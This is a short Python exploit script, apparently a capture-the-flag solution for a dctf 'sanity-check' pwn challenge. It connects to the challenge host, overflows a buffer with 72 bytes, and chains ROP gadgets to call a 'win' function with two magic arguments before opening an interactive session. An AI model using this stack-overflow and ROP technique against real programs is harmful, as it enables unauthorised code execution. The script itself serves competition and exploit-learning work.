from ptrlib import *

sock = Socket('dctf-chall-pwn-sanity-check.westeurope.azurecontainer.io',7480)
print(sock.recvline())

pop_rdi = p64(0x400813)
pop_rsi_r15 = p64(0x400811)
win = p64(0x400697)

payload = b'A'*72
payload += pop_rdi
payload += p64(-0x21524111)
payload += pop_rsi_r15
payload += p64(0x1337c0de)
payload += p64(0x0)
payload += win

sock.sendline(payload)
print(sock.recvline())
sock.interactive()